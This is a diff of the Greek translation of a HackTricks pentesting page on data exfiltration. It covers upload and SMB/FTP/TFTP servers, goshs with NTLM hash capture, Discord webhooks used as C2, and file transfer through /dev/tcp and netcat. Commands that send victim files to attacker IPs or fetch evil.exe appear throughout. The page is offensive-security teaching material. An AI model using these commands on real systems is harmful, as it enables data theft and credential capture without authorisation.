@@ -3,7 +3,7 @@
 {{#include ../banners/hacktricks-training.md}}
 
 > [!TIP]
-> Για ένα end-to-end παράδειγμα του staging loot στο `C:\Users\Public` και exfiltrating με Rclone για να μιμηθεί νόμιμα backups, δείτε τη ροή εργασίας παρακάτω.
+> Για ένα end-to-end παράδειγμα staging loot στο `C:\Users\Public` και exfiltrating το με Rclone ώστε να μιμείται νόμιμα backups, δες το workflow παρακάτω.
 
 {{#ref}}
 ../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
@@ -11,7 +11,7 @@
 
 ## Commonly whitelisted domains to exfiltrate information
 
-Ελέγξτε [https://lots-project.com/](https://lots-project.com/) για να βρείτε κοινά whitelisted domains που μπορούν να καταχραστούν
+Δες [https://lots-project.com/](https://lots-project.com/) για να βρεις commonly whitelisted domains που μπορούν να abused
 
 ## Copy\&Paste Base64
 
@@ -49,11 +49,11 @@ Start-BitsTransfer -Source $url -Destination $output
 #OR
 Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ```
-### Μεταφόρτωση αρχείων
+### Upload files
 
 - [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
-- [**SimpleHttpServer που εμφανίζει GET and POSTs (και headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
-- Μονάδα Python [uploadserver](https://pypi.org/project/uploadserver/):
+- [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
+- Python module [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
 python3 -m pip install --user uploadserver
@@ -66,7 +66,7 @@ curl -X POST http://HOST/upload -H -F 'files=@file.txt'
 # With basic auth:
 # curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
 ```
-### **HTTPS Διακομιστής**
+### **HTTPS Server**
 ```python
 # from https://gist.github.com/dergachev/7028596
 # taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
@@ -107,13 +107,46 @@ if __name__ == "__main__":
 app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ###
 ```
-## Webhooks (Discord/Slack/Teams) για C2 & Data Exfiltration
+### goshs
 
-Webhooks είναι write-only HTTPS endpoints που δέχονται JSON και προαιρετικά μέρη αρχείων. Συνήθως επιτρέπονται σε αξιόπιστα SaaS domains και δεν απαιτούν OAuth/API keys, καθιστώντας τα χρήσιμα για low-friction beaconing και exfiltration.
+[goshs](https://github.com/patrickhener/goshs) είναι ένα single-binary αντικατάσταση για το `python3 -m http.server`
+με upload, download, WebDAV, SFTP, SMB, TLS, authentication, share links,
+και OOB συνεργατικές δυνατότητες (DNS, SMTP, NTLM hash capture).
+```bash
+# Serve current directory on port 8000
+goshs
 
-Key ideas:
-- Endpoint: Discord uses https://discord.com/api/webhooks/<id>/<token>
-- POST multipart/form-data with a part named payload_json containing {"content":"..."} and optional file part(s) named file.
+# Serve with HTTPS (self-signed)
+goshs -s -ss
+
+# Serve with basic auth
+goshs -b user:password
+
+# Upload-only mode
+goshs -uo
+
+# Read-only mode
+goshs -ro
+
+# Capture SMB NTLM hashes
+goshs -smb -smb-domain CORP
+
+# DNS callback server
+goshs -dns -dns-ip 10.10.10.10
+
+# SMTP callback server
+goshs -smtp -smtp-domain [REDACTED]
+
+# Tunnel via localhost.run (no port forwarding needed)
+goshs -tunnel
+```
+## Webhooks (Discord/Slack/Teams) for C2 & Data Exfiltration
+
+Τα Webhooks είναι write-only HTTPS endpoints που δέχονται JSON και προαιρετικά file parts. Συνήθως επιτρέπονται προς trusted SaaS domains και δεν απαιτούν OAuth/API keys, κάτι που τα κάνει χρήσιμα για low-friction beaconing και exfiltration.
+
+Κύριες ιδέες:
+- Endpoint: Discord χρησιμοποιεί https://discord.com/api/webhooks/<id>/<token>
+- POST multipart/form-data με ένα part με όνομα payload_json που περιέχει {"content":"..."} και προαιρετικό file part(s) με όνομα file.
 - Operator loop pattern: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK επιβεβαιώνουν την παράδοση.
 
 PowerShell PoC (Discord):
@@ -185,8 +218,8 @@ Start-Sleep -Seconds 20
 }
 ```
 Σημειώσεις:
-- Παρόμοια μοτίβα εφαρμόζονται σε άλλες πλατφόρμες συνεργασίας (Slack/Teams) που χρησιμοποιούν τα incoming webhooks; προσαρμόστε το URL και το JSON schema ανάλογα.
-- Για DFIR των Discord Desktop cache artifacts και webhook/API recovery, δείτε:
+- Παρόμοια patterns εφαρμόζονται και σε άλλες collaboration platforms (Slack/Teams) χρησιμοποιώντας τα incoming webhooks τους· προσαρμόστε το URL και το JSON schema ανάλογα.
+- Για DFIR of Discord Desktop cache artifacts και webhook/API recovery, δείτε:
 
 {{#ref}}
 ../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
@@ -194,17 +227,17 @@ Start-Sleep -Seconds 20
 
 ## FTP
 
-### Διακομιστής FTP (python)
+### FTP server (python)
 ```bash
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
 ```
-### Διακομιστής FTP (NodeJS)
+### FTP server (NodeJS)
 ```
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
 ```
-### FTP διακομιστής (pure-ftp)
+### FTP server (pure-ftp)
 ```bash
 apt-get update && apt-get install pure-ftp
 ```
@@ -222,7 +255,7 @@ mkdir -p /ftphome
 chown -R ftpuser:ftpgroup /ftphome/
 /etc/init.d/pure-ftpd restart
 ```
-### **Windows** πελάτης
+### **Windows** client
 ```bash
 #Work well with python. With pure-ftp use fusr:ftp
 echo open 10.11.0.41 21 > ftp.txt
@@ -235,14 +268,14 @@ ftp -n -v -s:ftp.txt
 ```
 ## SMB
 
-Kali ως διακομιστής
+Kali ως server
 ```bash
 kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
 kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-Ή δημιουργήστε ένα smb share **χρησιμοποιώντας samba**:
+Ή δημιουργήστε ένα smb share **using samba**:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -265,15 +298,25 @@ CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentia
 WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
 WindPS-2> cd new_disk:
 ```
+### goshs
+[goshs](https://github.com/patrickhener/goshs) είναι μια εναλλακτική single-binary
+που σερβίρει αρχεία μέσω SMB και καταγράφει NetNTLMv2 hashes από clients που συνδέονται:
+```bash
+# Start SMB server with NTLM hash capture
+goshs -smb -smb-domain CORP
+
+# Also works for plain HTTP file serving
+goshs
+```
 ## SCP
 
-Ο επιτιθέμενος πρέπει να έχει SSHd σε λειτουργία.
+Ο επιτιθέμενος πρέπει να έχει το SSHd σε λειτουργία.
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-Αν το victim έχει SSH, ο attacker μπορεί να mount ένα directory από το victim στον attacker.
+Αν το θύμα έχει SSH, ο επιτιθέμενος μπορεί να κάνει mount έναν κατάλογο από το θύμα προς τον επιτιθέμενο.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -286,19 +329,19 @@ nc -vn <IP> 4444 < exfil_file
 ```
 ## /dev/tcp
 
-### Λήψη αρχείου από victim
+### Λήψη αρχείου από το θύμα
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### Μεταφόρτωση αρχείου στο θύμα
+### Ανέβασμα αρχείου στο θύμα
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
 exec 6< /dev/tcp/10.10.10.10/4444
 cat <&6 > file.txt
 ```
-ευχαριστίες σε **@BinaryShadow\_**
+thanks to **@BinaryShadow\_**
 
 ## **ICMP**
 ```bash
@@ -320,27 +363,41 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-Εάν μπορείτε να στείλετε δεδομένα σε έναν διακομιστή SMTP, μπορείτε να δημιουργήσετε έναν διακομιστή SMTP για να λάβετε τα δεδομένα με python:
+Αν μπορείς να στείλεις δεδομένα σε έναν SMTP server, μπορείς να δημιουργήσεις έναν SMTP για να λάβεις τα δεδομένα με python:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
+```
+### goshs
+
+Το [goshs](https://github.com/patrickhener/goshs) μπορεί να στήσει γρήγορα έναν SMTP server
+για να πιάσει email callbacks κατά τη διάρκεια OOB exfiltration scenarios:
+```bash
+# Start SMTP callback server
+goshs -smtp -smtp-domain [REDACTED]
+```
+Τα ληφθέντα emails και τα callbacks εμφανίζονται απευθείας στο terminal output.
+Μπορεί να συνδυαστεί με τον DNS callback server για πλήρη OOB κάλυψη:
+```bash
+# DNS + SMTP combined
+goshs -dns -dns-ip 10.10.10.10 -smtp -smtp-domain [REDACTED]
 ```
 ## TFTP
 
 Από προεπιλογή στα XP και 2003 (σε άλλα χρειάζεται να προστεθεί ρητά κατά την εγκατάσταση)
 
-Στο Kali, **ξεκινήστε TFTP server**:
+Στο Kali, **start TFTP server**:
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
-**TFTP server σε python:**
+**TFTP server in python:**
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-Στο **victim**, συνδεθείτε στον Kali server:
+Στο **victim**, συνδεθείτε στον διακομιστή Kali:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
@@ -388,21 +445,22 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Το πρόγραμμα `debug.exe` όχι μόνο επιτρέπει την επιθεώρηση των binaries αλλά έχει επίσης την **ικανότητα να τα ανακατασκευάσει από hex**. Αυτό σημαίνει ότι παρέχοντας ένα hex ενός binary, το `debug.exe` μπορεί να δημιουργήσει το αρχείο binary. Ωστόσο, είναι σημαντικό να σημειωθεί ότι το debug.exe έχει έναν **περιορισμό στο να συναρμολογεί αρχεία έως και 64 kb σε μέγεθος**.
+Το πρόγραμμα `debug.exe` όχι μόνο επιτρέπει την επιθεώρηση binaries, αλλά έχει επίσης τη **δυνατότητα να τα ανακατασκευάζει από hex**. Αυτό σημαίνει ότι, δίνοντας ένα hex ενός binary, το `debug.exe` μπορεί να δημιουργήσει το binary file. Ωστόσο, είναι σημαντικό να σημειωθεί ότι το debug.exe έχει έναν **περιορισμό στη συναρμολόγηση αρχείων έως 64 kb σε μέγεθος**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-Στη συνέχεια, κάντε αντιγραφή και επικόλληση του κειμένου στο windows-shell και θα δημιουργηθεί ένα αρχείο με όνομα nc.exe.
+Κάνε τότε copy-paste το κείμενο στο windows-shell και θα δημιουργηθεί ένα αρχείο που ονομάζεται nc.exe.
 
 - [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
 ## DNS
 
 - [https://github.com/Stratiz/DNS-Exfil](https://github.com/Stratiz/DNS-Exfil)
+- [https://github.com/patrickhener/goshs](https://github.com/patrickhener/goshs)
 
-## Αναφορές
+## References
 
 - [Discord as a C2 and the cached evidence left behind](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
 - [Discord Webhooks – Execute Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
